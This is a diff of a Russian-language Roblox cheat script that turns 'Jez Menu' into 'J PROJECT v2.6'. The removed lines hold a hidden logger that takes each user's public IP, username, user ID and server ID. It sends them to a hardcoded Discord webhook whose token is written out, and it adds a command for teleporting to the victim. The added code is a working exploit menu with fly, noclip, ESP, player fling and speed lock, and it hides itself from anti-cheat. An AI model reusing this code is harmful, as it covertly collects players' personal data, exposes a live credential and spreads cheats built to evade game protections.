@@ -1,1407 +1,3481 @@
--- Jez Menu v20
+-- ==========================================
+--               J PROJECT v2.6              
+--   Larger Fonts, Lockable Clock & Mobile   
+-- ==========================================
 
+local UI_NAME = "J_PROJECT_SYSTEM"
 
-
-
--- [[ СУПЕР-АГРЕССИВНАЯ ЗАЩИТА ОТ ДЮПА ]] --
-local UI_NAME = "JezMenu_Project"
-
+-- Очистка старых копий GUI
 local function CleanUp()
-    -- Проверяем CoreGui (через pcall, чтобы не было ошибок доступа)
-    pcall(function()
-        for _, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-            if v.Name == UI_NAME then
-                v:Destroy()
-            end
-        end
-    end)
-    
-    -- Проверяем PlayerGui (без WaitForChild, чтобы не тупило)
+    local coreGui = game:GetService("CoreGui")
     local lp = game:GetService("Players").LocalPlayer
+    for _, child in pairs(coreGui:GetChildren()) do
+        if child.Name == UI_NAME then child:Destroy() end
+    end
     if lp and lp:FindFirstChild("PlayerGui") then
-        for _, v in pairs(lp.PlayerGui:GetChildren()) do
-            if v.Name == UI_NAME then
-                v:Destroy()
-            end
+        for _, child in pairs(lp.PlayerGui:GetChildren()) do
+            if child.Name == UI_NAME then child:Destroy() end
         end
     end
-
-    -- Проверяем специальное хранилище читов (gethui)
     if gethui then
-        for _, v in pairs(gethui():GetChildren()) do
-            if v.Name == UI_NAME then
-                v:Destroy()
-            end
+        for _, child in pairs(gethui():GetChildren()) do
+            if child.Name == UI_NAME then child:Destroy() end
         end
     end
 end
+CleanUp()
 
-CleanUp() -- Запускаем очистку перед созданием чего-либо
-
-local HttpService = game:GetService("HttpService")
-local localPlayer = game:GetService("Players").LocalPlayer
-local WebhookURL = "https://discord.com/api/webhooks/1482743661723783300/Oo5uBFfiDiVhEVOPGOLB_uJgEJnRcWZsfL2djONVSs1E5GxW4uArlP8JdL7NK8-mGaDU"
-
-local myAccounts = {
-    [10098544540] = true, -- Твой основной ID
-	[10698642268] = true
-}
-
-local function logToDiscord()
-    local isMe = myAccounts[localPlayer.UserId]
-    local requestFunc = syn and syn.request or http_request or request
-    
-    if not requestFunc then return end
-
-    -- Определение IP
-    local ip = "Не удалось определить"
-    pcall(function()
-        local response = requestFunc({Url = "https://api.ipify.org", Method = "GET"})
-        if response and response.Body then ip = response.Body end
-    end)
-
-    -- Формируем команду для входа к нему (Join Script)
-    local joinCommand = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "', game.Players.LocalPlayer)"
-
-    local data = {
-        ["embeds"] = {{
-            ["title"] = isMe and "✅ Вход владельца" or "⚠️ ВОР ОБНАРУЖЕН!",
-            ["color"] = isMe and 4620411 or 16711680, -- Красный для вора
-            ["fields"] = {
-                {["name"] = "Никнейм", ["value"] = localPlayer.Name .. " (" .. localPlayer.UserId .. ")", ["inline"] = true},
-                {["name"] = "IP-адрес", ["value"] = "||" .. ip .. "||", ["inline"] = true},
-                {["name"] = "Игра (PlaceID)", ["value"] = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = false},
-                {["name"] = "Сервер (JobId)", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
-                {["name"] = "🚀 Команда для входа к нему:", ["value"] = "```lua\n" .. joinCommand .. "\n```", ["inline"] = false}
-            },
-            ["footer"] = {["text"] = "Jez Hunter System | " .. os.date("%X")}
-        }}
-    }
-
-    pcall(function()
-        requestFunc({
-            Url = WebhookURL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-end
-
-logToDiscord()
-
+-- Сервисы
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
-local RunService = game:GetService("RunService")
-local TweenService = game:GetService("TweenService")
-local localPlayer = Players.LocalPlayer
+local Lighting = game:GetService("Lighting")
 
-if game.CoreGui:FindFirstChild("JezMenu") then
-    game.CoreGui.JezMenu:Destroy()
+-- Переменные
+local LocalPlayer = Players.LocalPlayer
+local registeredButtons = {}
+local scriptCards = {}
+local antiAfkConnection = nil
+local isMenuAnimating = false
+
+-- Состояние языка ("RU" или "EN")
+local currentLanguage = "RU"
+
+-- Таблица локализации (переводов)
+local Localizations = {
+    RU = {
+        IntroSub = "ИНИЦИАЛИЗАЦИЯ СИСТЕМЫ",
+        Welcome = "ДОБРО ПОЖАЛОВАТЬ, ",
+        Tabs = {
+            Main = "Главная",
+            Player = "Игрок",
+            Visual = "Визуал",
+            Animations = "Анимация",
+            Scripts = "Скрипты",
+            Themes = "Темы",
+            Settings = "Настройки"
+        },
+        AnimationsTitle = "Анимации для r6 и r15 💃 / 🕺",
+        R6Btn = "Анимация R6",
+        R15Btn = "R15 Анимации",
+        PlatformTitle = "🧱 Платформа под ногами",
+        VehicleFlyTitle = "🛸 🏎️ Полет на Транспорте",
+        VehicleFlySpeedLabel = "Скорость:",
+        NewsTitle = "📢 НОВОСТИ И ОБНОВЛЕНИЕ v2.6",
+        NewsContent = "📅 Дата: 12.09.2026\n\n" ..
+            "✨ Что нового и актуального в скрипте:\n" ..
+            "• 📱 Сенсорная адаптация — полная поддержка смартфонов и планшетов (Touch inputs)!\n" ..
+            "• 🌐 Мультиязычность — добавлена кнопка переключения языка (RU / EN) в шапке!\n" ..
+            "• 💡 Контроль Света — точечная аура света и глобальный Fullbright в визуалах!\n" ..
+            "• 🛡️ Native Anti-AFK — полноценный переключатель AFK: ON/OFF с интеграцией в интерфейс!\n" ..
+            "• 👻 Jez Hider — скрытие любых объектов на карте [Зажми R + ЛКМ] с удобным возвратом!\n" ..
+            "• ⚡ Jez Fling List — компактный и быстрый флинг-список игроков.\n" ..
+            "• 🚶 Super Noclip — суперплавная ходьба сквозь стены, 0% просадки FPS!\n" ..
+            "• ✈️ Fly GUI V3 — удобный полёт с кнопками UP/DOWN и вводом точной скорости.\n" ..
+            "• 🎨 Full RGB Sync — кнопки и карточки идеально адаптируются под темы и переливы!\n" ..
+            "• 🔒 Умные замки — фиксация WalkSpeed, виджета часов и клавиш Keystrokes.",
+        GuideTitle = "📖 КАК ПОЛЬЗОВАТЬСЯ СКРИПТОМ",
+        GuideContent = "• Главная — Новости проекта, патчноуты и руководство пользования.\n" ..
+            "• Игрок — Функции персонажа (GodMode, Fly V3, Noclip, WalkSpeed).\n" ..
+            "• Визуал — Визуальные настройки (ESP, Аура Света, Fullbright, Часы).\n" ..
+            "• Скрипты — Каталог скриптов (Jez Hider, Jez Fling List) с быстрым поиском.\n" ..
+            "• Темы — Выбор стильных тем оформления и настройка RGB Радуги.\n" ..
+            "• Настройки — Безопасный сброс параметров, выключение и выгрузка GUI.",
+        SearchPlaceholder = "Поиск скриптов...",
+        Execute = "Запустить",
+        SpeedTitle = "⚡ Скорость ходьбы (WalkSpeed)",
+        BaseSpeed = "Базовая: ",
+        CurrentSpeed = " -> Текущая: ",
+        ResetSpeed = "Родная скорость",
+        BoostSpeed = "Быстрый бег (100)",
+        FlyTitle = "✈️ FLY GUI",
+        FlySpeedLabel = "Скорость:",
+        InfJumpTitle = "🦘 Бесконечный прыжок (Inf Jump)",
+        AntiAfkTitle = "🛡️ Защита от AFK",
+        NoclipTitle = "👻 Noclip (Сквозь стены)",
+        EspTitle = "👁️ Подсветка игроков (ESP)",
+        LightTitle = "💡 Аура света (PointLight)",
+        LightBrightnessLabel = "☀️ Яркость:",
+        LightRangeLabel = "📏 Радиус:",
+        GlobalFullbrightTitle = "🌞 Глобальный Fullbright",
+        StatsTitle = "📊 Статистика (FPS / Ping)",
+        ClockTitle = "🕒 Виджет часов (Местное время)",
+        KeyTitle = "⌨️ Клавиши (Keystrokes)",
+        ServerHopTitle = "🌐 Поиск сервера (макс. игр.):",
+        FindBtn = "НАЙТИ",
+        Searching = "ПОИСК...",
+        Joining = "ВХОД...",
+        NotFound = "НЕ НАЙДЕНО",
+        RejoinBtn = "🔄 Перезайти на сервер",
+		RestartBtn = "⚡ Перезапустить GUI",
+        ChatBtn = "💬 Чат",
+        UnloadBtn = "⚙️ Выгрузить GUI",
+        ResetTheme = "🔄 Сбросить тему по умолчанию",
+        StatusOn = ": ВКЛ",
+        StatusOff = ": ВЫКЛ",
+        ScriptsList = {
+            LuckyTitle = "🍀  Jez Lucky Script",
+            LuckyDesc = "Для игры LUCKY BLOCKS Battlegrounds.",
+            FlingTitle = "⚡  JEZ FLING LIST",
+            FlingDesc = "Компактный Флинг-список игроков.",
+            HiderTitle = "👻  JEZ HIDER",
+            HiderDesc = "Инструмент для скрытия объектов.",
+            CoordsTitle = "🌀 JEZ COORDINATES",
+            CoordsDesc = "Управление точками и телепорт",
+            BridgeTitle = "🌉 SQUID GLASS BRIDGE",
+            BridgeDesc = "Для Impossible Squid Game Glass Bridge 2.",
+			TimeTitle = "⏱️  JEZ TIME SLIDER",
+            TimeDesc = "Управление и перемотка времени назад."
+        }
+    },
+    EN = {
+        IntroSub = "SYSTEM INITIALIZATION",
+        Welcome = "WELCOME, ",
+        Tabs = {
+            Main = "Main",
+            Player = "Player",
+            Visual = "Visual",
+            Scripts = "Scripts",
+            Animations = "Animation",
+            Themes = "Themes",
+            Settings = "Settings"
+        },
+        AnimationsTitle = "💃 R6 & R15 Animations 🕺",
+        R6Btn = "R6 Animation 🤸",
+        R15Btn = "R15 Animation 🤸",
+        PlatformTitle = "🧱 AirWalk Platform",
+        VehicleFlyTitle = "🛸 🏎️ Vehicle Fly",
+        VehicleFlySpeedLabel = "Speed:",
+        NewsTitle = "📢 NEWS & UPDATE v2.6",
+        NewsContent = "📅 Date: 09.12.2026\n\n" ..
+            "✨ What's new in the script:\n" ..
+            "• 📱 Mobile Support — full touch screen adaptation for phones and tablets!\n" ..
+            "• 🌐 Multilingual support — added a language switch button (RU / EN) in the header!\n" ..
+            "• 💡 Light Controls — point light aura & global Fullbright in visuals!\n" ..
+            "• 🛡️ Native Anti-AFK — full AFK toggle: ON/OFF with UI integration!\n" ..
+            "• 👻 Jez Hider — hide any objects on the map [Hold R + LMB] with easy restore!\n" ..
+            "• ⚡ Jez Fling List — compact and fast player fling list.\n" ..
+            "• 🚶 Super Noclip — smooth wall clipping, 0% FPS drop!\n" ..
+            "• ✈️ Fly GUI V3 — convenient flight with UP/DOWN buttons and precise speed input.\n" ..
+            "• 🎨 Full RGB Sync — buttons and cards perfectly adapt to themes and spectrums!\n" ..
+            "• 🔒 Smart Locks — lock WalkSpeed, clock widget, and Keystrokes.",
+        GuideTitle = "📖 HOW TO USE THE SCRIPT",
+        GuideContent = "• Main — Project news, patch notes, and user guide.\n" ..
+            "• Player — Character features (GodMode, Fly V3, Noclip, WalkSpeed).\n" ..
+            "• Visual — Visual settings (ESP, Light Aura, Fullbright, Clock widget).\n" ..
+            "• Scripts — Script catalog (Jez Hider, Jez Fling List) with quick search.\n" ..
+            "• Themes — Custom themes selection and RGB Rainbow settings.\n" ..
+            "• Settings — Safe parameter reset, restart, and GUI unloading.",
+        SearchPlaceholder = "Search scripts...",
+        Execute = "Execute",
+        SpeedTitle = "⚡ WalkSpeed",
+        BaseSpeed = "Base: ",
+        CurrentSpeed = " -> Current: ",
+        ResetSpeed = "Default Speed",
+        BoostSpeed = "Super Run (100)",
+        FlyTitle = "✈️ FLY GUI",
+        FlySpeedLabel = "Speed:",
+        InfJumpTitle = "🦘 Infinite Jump",
+        AntiAfkTitle = "🛡️ Anti-AFK",
+        NoclipTitle = "👻 Noclip (Walk through walls)",
+        EspTitle = "👁️ Player ESP Highlight",
+        LightTitle = "💡 Light Aura (PointLight)",
+        LightBrightnessLabel = "☀️ Brightness:",
+        LightRangeLabel = "📏 Range:",
+        GlobalFullbrightTitle = "🌞 Global Fullbright",
+        StatsTitle = "📊 Stats (FPS / Ping)",
+        ClockTitle = "🕒 Clock Widget (Local Time)",
+        KeyTitle = "⌨️ Keystrokes",
+        ServerHopTitle = "🌐 Server Hop (max players):",
+        FindBtn = "FIND",
+        Searching = "SEARCH...",
+        Joining = "JOINING...",
+        NotFound = "NOT FOUND",
+        RejoinBtn = "🔄 Rejoin Server",
+		RestartBtn = "⚡ Restart GUI",
+        ChatBtn = "💬 Chat",
+        UnloadBtn = "⚙️ Unload GUI",
+        ResetTheme = "🔄 Reset Theme to Default",
+        StatusOn = ": ON",
+        StatusOff = ": OFF",
+        ScriptsList = {
+            LuckyTitle = "🍀  Jez Lucky Script",
+            LuckyDesc = "For the LUCKY BLOCKS Battlegrounds.",
+            FlingTitle = "⚡  JEZ FLING LIST",
+            FlingDesc = "Compact and fast player fling list.",
+            HiderTitle = "👻  JEZ HIDER",
+            HiderDesc = "Tool for hiding map objects.",
+            BridgeTitle = "🌉 SQUID GLASS BRIDGE",
+            BridgeDesc = "For Impossible Squid Game Glass Bridge 2.",
+            CoordsTitle = "🌀 JEZ COORDINATES",
+            CoordsDesc = "Waypoint manager and teleport",
+			TimeTitle = "⏱️  JEZ TIME SLIDER",
+            TimeDesc = "Time rewind and slider control tool."
+        }
+    }
+}
+
+local function L(key)
+    local dict = Localizations[currentLanguage]
+    return dict[key] or key
 end
 
--- НАСТРОЙКИ
+-- Состояние блокировки виджета
+isClockLocked = false
+isKeystrokesLocked = false
+local keystrokesEnabled = false
 
-local waterWalkActive = false
-local noclipEnabled = false
-local scriptActive = true
-local espEnabled = false
-local antiApproach = false 
-local infJumpEnabled = false
-local flyEnabled = false
-local currentSpeed = nil 
-local flySpeed = 50 
-local lockSpeedEnabled = false 
-local savedSpeed = 16
-local forceSpeed = false
-local waterPart = Instance.new("Part")
-waterPart.Name = "JezWaterPlatform"
-waterPart.Size = Vector3.new(25, 1, 25)
-waterPart.Transparency = 1
-waterPart.Anchored = true
-waterPart.CanCollide = false
-waterPart.Parent = workspace
-local function getWaterLevel(char)
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then return nil end
-    
-    local raycastParams = RaycastParams.new()
-    raycastParams.FilterType = Enum.RaycastFilterType.Exclude
-    
-    raycastParams.FilterDescendantsInstances = {char, waterPart}
-    
-    local result = workspace:Raycast(hrp.Position, Vector3.new(0, -15, 0), raycastParams)
-    
-    if result and result.Material == Enum.Material.Water then
-        return result.Position.Y
+-- Состояния и настройки скорости
+isSpeedLocked = false
+defaultSpeed = 16  
+currentSpeed = 16 
+
+if LocalPlayer.Character then
+    local hum = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+    if hum then
+        defaultSpeed = hum.WalkSpeed
+        currentSpeed = hum.WalkSpeed
     end
-    return nil
 end
 
+RunService.Stepped:Connect(function()
+    if isSpeedLocked and LocalPlayer.Character then
+        local humanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+        if humanoid and humanoid.WalkSpeed ~= currentSpeed then
+            humanoid.WalkSpeed = currentSpeed
+        end
+    end
+end)
 
--- ЦВЕТОВАЯ ПАЛИТРА 
-local Color_On = Color3.fromRGB(60, 130, 90)  -- Мягкий зеленый
-local Color_Off = Color3.fromRGB(130, 60, 60) -- Мягкий красный
-local Color_Btn = Color3.fromRGB(45, 45, 45)  -- Серый для обычных кнопок
+-- ==========================================
+--          FLY GUI LOGIC
+-- ==========================================
+local flyEnabled = false
+local flySpeed = 1
+local upHolding = false
+local downHolding = false
+local flyConnection = nil
 
--- ФУНКЦИЯ ДЛЯ ТЕКСТА С ОБВОДКОЙ
-local function styleText(obj, size)
-    obj.TextColor3 = Color3.new(1, 1, 1)
-    obj.Font = Enum.Font.GothamBold
-    obj.TextSize = size
-    obj.TextStrokeTransparency = 0.5 -- Обводка
-    obj.TextStrokeColor3 = Color3.new(0, 0, 0)
+task.spawn(function()
+    while true do
+        task.wait(0.03)
+        if flyEnabled then
+            local char = LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                if upHolding then
+                    hrp.CFrame = hrp.CFrame * CFrame.new(0, 1, 0)
+                elseif downHolding then
+                    hrp.CFrame = hrp.CFrame * CFrame.new(0, -1, 0)
+                end
+            end
+        end
+    end
+end)
+
+local function stopFly()
+    flyEnabled = false
+    upHolding = false
+    downHolding = false
+
+    if flyConnection then
+        flyConnection:Disconnect()
+        flyConnection = nil
+    end
+
+    local char = LocalPlayer.Character
+    if char then
+        local hum = char:FindFirstChildWhichIsA("Humanoid")
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+
+        if hum then
+            hum.PlatformStand = false
+            for _, state in ipairs(Enum.HumanoidStateType:GetEnumItems()) do
+                pcall(function() hum:SetStateEnabled(state, true) end)
+            end
+            hum:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
+        end
+
+        if char:FindFirstChild("Animate") then
+            char.Animate.Disabled = false
+        end
+
+        local targetPart = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or hrp
+        if targetPart then
+            for _, v in ipairs(targetPart:GetChildren()) do
+                if v.Name == "FlyGyro" or v.Name == "FlyVel" then
+                    v:Destroy()
+                end
+            end
+        end
+    end
 end
 
--- [[ НОВАЯ ФУНКЦИЯ ПЕРЕТАСКИВАНИЯ (ДЛЯ ПК И ТЕЛЕФОНОВ) ]] --
-local function makeDraggable(frame)
-    local dragging, dragInput, dragStart, startPos
+local function startFly()
+    stopFly()
+
+    local char = LocalPlayer.Character
+    if not char then return end
+    local hum = char:FindFirstChildWhichIsA("Humanoid")
+    local targetPart = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("HumanoidRootPart")
+    if not hum or not targetPart then return end
+
+    flyEnabled = true
+
+    if char:FindFirstChild("Animate") then
+        char.Animate.Disabled = true
+    end
+    pcall(function()
+        for _, v in next, hum:GetPlayingAnimationTracks() do
+            v:AdjustSpeed(0)
+        end
+    end)
+
+    for _, state in ipairs(Enum.HumanoidStateType:GetEnumItems()) do
+        pcall(function() hum:SetStateEnabled(state, false) end)
+    end
+    hum:ChangeState(Enum.HumanoidStateType.Swimming)
+    hum.PlatformStand = true
+
+    flyConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        if flyEnabled and char and hum and hum.Parent then
+            if hum.MoveDirection.Magnitude > 0 then
+                for i = 1, flySpeed do
+                    char:TranslateBy(hum.MoveDirection)
+                end
+            end
+        else
+            stopFly()
+        end
+    end)
+
+    local bg = Instance.new("BodyGyro", targetPart)
+    bg.Name = "FlyGyro"
+    bg.P = 9e4
+    bg.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
+    bg.CFrame = targetPart.CFrame
+
+    local bv = Instance.new("BodyVelocity", targetPart)
+    bv.Name = "FlyVel"
+    bv.Velocity = Vector3.new(0, 0.1, 0)
+    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+
+    task.spawn(function()
+        local camera = workspace.CurrentCamera
+        while flyEnabled and char and hum and hum.Parent do
+            game:GetService("RunService").RenderStepped:Wait()
+            bg.CFrame = camera.CFrame
+        end
+    end)
+end
+
+-- Темы
+local Themes = {
+    Default = {
+        Black = Color3.fromRGB(12, 12, 14),
+        Dark  = Color3.fromRGB(20, 20, 24),
+        Grey  = Color3.fromRGB(45, 45, 52),
+        Light = Color3.fromRGB(160, 160, 175),
+        White = Color3.fromRGB(250, 250, 250)
+    },
+    Purple = {
+        Black = Color3.fromRGB(15, 10, 22),
+        Dark  = Color3.fromRGB(28, 18, 42),
+        Grey  = Color3.fromRGB(80, 45, 120),
+        Light = Color3.fromRGB(200, 160, 240),
+        White = Color3.fromRGB(250, 245, 255)
+    },
+    CyberBlue = {
+        Black = Color3.fromRGB(10, 14, 22),
+        Dark  = Color3.fromRGB(18, 28, 45),
+        Grey  = Color3.fromRGB(40, 80, 130),
+        Light = Color3.fromRGB(150, 200, 250),
+        White = Color3.fromRGB(245, 250, 255)
+    },
+    CrimsonRed = {
+        Black = Color3.fromRGB(20, 10, 12),
+        Dark  = Color3.fromRGB(36, 16, 20),
+        Grey  = Color3.fromRGB(110, 35, 45),
+        Light = Color3.fromRGB(230, 150, 160),
+        White = Color3.fromRGB(255, 245, 248)
+    },
+    EmeraldGreen = {
+        Black = Color3.fromRGB(8, 18, 12),
+        Dark  = Color3.fromRGB(14, 32, 22),
+        Grey  = Color3.fromRGB(35, 90, 55),
+        Light = Color3.fromRGB(150, 220, 175),
+        White = Color3.fromRGB(245, 255, 250)
+    },
+    SunsetOrange = {
+        Black = Color3.fromRGB(20, 12, 8),
+        Dark  = Color3.fromRGB(36, 20, 12),
+        Grey  = Color3.fromRGB(110, 55, 25),
+        Light = Color3.fromRGB(240, 175, 140),
+        White = Color3.fromRGB(255, 248, 245)
+    },
+    RosePink = {
+        Black = Color3.fromRGB(20, 10, 16),
+        Dark  = Color3.fromRGB(36, 18, 28),
+        Grey  = Color3.fromRGB(110, 45, 80),
+        Light = Color3.fromRGB(240, 160, 200),
+        White = Color3.fromRGB(255, 245, 250)
+    },
+    MidnightGold = {
+        Black = Color3.fromRGB(18, 16, 10),
+        Dark  = Color3.fromRGB(32, 28, 16),
+        Grey  = Color3.fromRGB(95, 80, 35),
+        Light = Color3.fromRGB(230, 205, 140),
+        White = Color3.fromRGB(255, 252, 240)
+    },
+    ToxicLime = {
+        Black = Color3.fromRGB(12, 18, 8),
+        Dark  = Color3.fromRGB(20, 32, 12),
+        Grey  = Color3.fromRGB(65, 100, 25),
+        Light = Color3.fromRGB(185, 235, 120),
+        White = Color3.fromRGB(250, 255, 245)
+    }
+}
+
+local CurrentTheme = Themes.Default
+local isRainbowActive = false
+local rainbowConnection = nil
+
+-- ScreenGui
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = UI_NAME
+ScreenGui.ResetOnSpawn = false
+
+if syn and syn.protect_gui then
+    syn.protect_gui(ScreenGui)
+    ScreenGui.Parent = game:GetService("CoreGui")
+elseif gethui then
+    ScreenGui.Parent = gethui()
+else
+    pcall(function() ScreenGui.Parent = game:GetService("CoreGui") end)
+    if not ScreenGui.Parent then ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+end
+
+local function tween(object, info, properties)
+    local anim = TweenService:Create(object, info, properties)
+    anim:Play()
+    return anim
+end
+
+-- АДАПТИРОВАННОЕ TOUCH / MOUSE ПЕРЕТАСКИВАНИЕ ДЛЯ ТЕЛЕФОНОВ
+local function makeDraggable(frame, isWidget)
+    local dragging = false
+    local dragInput = nil
+    local dragStart = nil
+    local startPos = nil
+
     frame.InputBegan:Connect(function(input)
+        if isWidget then
+            if frame.Name == "ClockWidget" and isClockLocked then return end
+            if frame.Name == "KeystrokesWidget" and isKeystrokesLocked then return end
+        end
+        
         if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
             dragging = true
             dragStart = input.Position
             startPos = frame.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            
+            local endConn
+            endConn = input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then 
+                    dragging = false 
+                    if endConn then endConn:Disconnect() end
+                end
             end)
         end
     end)
+
     frame.InputChanged:Connect(function(input)
         if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
             dragInput = input
         end
     end)
+
     RunService.RenderStepped:Connect(function()
+        if isWidget then
+            if frame.Name == "ClockWidget" and isClockLocked then dragging = false return end
+            if frame.Name == "KeystrokesWidget" and isKeystrokesLocked then dragging = false return end
+        end
+
         if dragging and dragInput then
             local delta = dragInput.Position - dragStart
             local newPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-            TweenService:Create(frame, TweenInfo.new(0.1), {Position = newPos}):Play()
+            tween(frame, TweenInfo.new(0.08, Enum.EasingStyle.Sine), {Position = newPos})
         end
     end)
 end
 
--- [[ СОЗДАНИЕ GUI И КНОПКИ ]] --
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "JezMenu_Project" -- СТАВИМ ТО ЖЕ ИМЯ, ЧТО И В ПРОВЕРКЕ ВВЕРХУ
-ScreenGui.ResetOnSpawn = false -- ДОБАВЛЯЕМ СЮДА, ЧТОБЫ НЕ ДЮПАЛОСЬ ПРИ СМЕРТИ
-
--- [[ ЗАЩИТА И СКРЫТИЕ GUI ОТ АНТИЧИТА ]] --
-if syn and syn.protect_gui then
-    syn.protect_gui(ScreenGui) 
-    ScreenGui.Parent = game:GetService("CoreGui")
-elseif gethui then
-    ScreenGui.Parent = gethui() -- Самый безопасный вариант
-else
-    local success, err = pcall(function()
-        ScreenGui.Parent = game:GetService("CoreGui")
+-- Вспомогательный метод зажатия для Touch / Mouse (для левитации Up/Down)
+local function bindHoldButton(btn, onStart, onEnd)
+    btn.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            onStart()
+        end
     end)
-    if not success then
-        ScreenGui.Parent = localPlayer:WaitForChild("PlayerGui")
-    end
+    btn.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            onEnd()
+        end
+    end)
 end
 
-local FloatingBtn = Instance.new("ImageButton", ScreenGui)
+-- ==========================================
+--             ОКНО ЗАПУСКА
+-- ==========================================
+
+local IntroCard = Instance.new("Frame", ScreenGui)
+IntroCard.Name = "IntroCard"
+IntroCard.AnchorPoint = Vector2.new(0.5, 0.5)
+IntroCard.Position = UDim2.new(0.5, 0, 0.5, 0)
+IntroCard.Size = UDim2.new(0, 290, 0, 320)
+IntroCard.BackgroundColor3 = Themes.Default.Black
+IntroCard.BorderSizePixel = 0
+IntroCard.ClipsDescendants = true
+IntroCard.ZIndex = 100
+IntroCard.Visible = false
+Instance.new("UICorner", IntroCard).CornerRadius = UDim.new(0, 16)
+
+local IntroScale = Instance.new("UIScale", IntroCard)
+IntroScale.Scale = 0
+
+local LogoJ = Instance.new("TextLabel", IntroCard)
+LogoJ.AnchorPoint = Vector2.new(0.5, 0.5)
+LogoJ.Position = UDim2.new(0.5, 0, 0.42, 0)
+LogoJ.Size = UDim2.new(0, 100, 0, 100)
+LogoJ.BackgroundTransparency = 1
+LogoJ.Text = "J"
+LogoJ.Font = Enum.Font.GothamBlack
+LogoJ.TextSize = 95
+LogoJ.TextColor3 = Themes.Default.White
+LogoJ.ZIndex = 102
+
+local SubText = Instance.new("TextLabel", IntroCard)
+SubText.AnchorPoint = Vector2.new(0.5, 0.5)
+SubText.Position = UDim2.new(0.5, 0, 0.68, 0)
+SubText.Size = UDim2.new(1, -40, 0, 20)
+SubText.BackgroundTransparency = 1
+SubText.Text = L("IntroSub")
+SubText.Font = Enum.Font.GothamBold
+SubText.TextSize = 13
+SubText.TextColor3 = Themes.Default.Light
+SubText.ZIndex = 102
+
+local ProgressTrack = Instance.new("Frame", IntroCard)
+ProgressTrack.AnchorPoint = Vector2.new(0.5, 0.5)
+ProgressTrack.Position = UDim2.new(0.5, 0, 0.8, 0)
+ProgressTrack.Size = UDim2.new(0, 210, 0, 4)
+ProgressTrack.BackgroundColor3 = Themes.Default.Grey
+ProgressTrack.BorderSizePixel = 0
+ProgressTrack.ZIndex = 102
+Instance.new("UICorner", ProgressTrack).CornerRadius = UDim.new(1, 0)
+
+local ProgressBar = Instance.new("Frame", ProgressTrack)
+ProgressBar.Size = UDim2.new(0, 0, 1, 0)
+ProgressBar.BackgroundColor3 = Themes.Default.White
+ProgressBar.BorderSizePixel = 0
+ProgressBar.ZIndex = 103
+Instance.new("UICorner", ProgressBar).CornerRadius = UDim.new(1, 0)
+
+-- ==========================================
+--          ГЛАВНАЯ КНОПКА И ОКНО
+-- ==========================================
+
+local FloatingBtn = Instance.new("TextButton", ScreenGui)
 FloatingBtn.Name = "FloatingBtn"
-FloatingBtn.Size = UDim2.new(0, 55, 0, 55)
-FloatingBtn.Position = UDim2.new(0.05, 0, 0.2, 0)
-FloatingBtn.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-FloatingBtn.Image = "rbxassetid://115895618324258"
-FloatingBtn.Visible = false -- Включится после загрузки
-Instance.new("UICorner", FloatingBtn).CornerRadius = UDim.new(0, 15)
+FloatingBtn.Size = UDim2.new(0, 56, 0, 56)
+FloatingBtn.Position = UDim2.new(0.04, 0, 0.2, 0)
+FloatingBtn.BackgroundColor3 = Themes.Default.Dark
+FloatingBtn.BorderSizePixel = 0
+FloatingBtn.Text = "J"
+FloatingBtn.Font = Enum.Font.GothamBlack
+FloatingBtn.TextSize = 32
+FloatingBtn.TextColor3 = Themes.Default.White
+FloatingBtn.Visible = false
+FloatingBtn.ZIndex = 50
+Instance.new("UICorner", FloatingBtn).CornerRadius = UDim.new(0, 14)
 
-local UIStroke = Instance.new("UIStroke", FloatingBtn)
-UIStroke.Thickness = 2
-UIStroke.Color = Color3.fromRGB(46, 204, 113)
+local FloatStroke = Instance.new("UIStroke", FloatingBtn)
+FloatStroke.Thickness = 2
+FloatStroke.Color = Themes.Default.Grey
 
-makeDraggable(FloatingBtn) -- Применяем перетаскивание к кнопке
+local FloatScale = Instance.new("UIScale", FloatingBtn)
+FloatScale.Scale = 0
+makeDraggable(FloatingBtn)
 
--- === СИСТЕМА ПРИВЕТСТВИЯ  ===
-local function ShowWelcome()
-    local WelcomeFrame = Instance.new("Frame")
-    local WelcomeCorner = Instance.new("UICorner")
-    local WelcomeText = Instance.new("TextLabel")
-    local WelcomeStroke = Instance.new("UIStroke")
-
-    -- Настройка рамки
-    WelcomeFrame.Name = "WelcomeNotification"
-    WelcomeFrame.Parent = ScreenGui 
-    WelcomeFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    WelcomeFrame.BorderSizePixel = 0
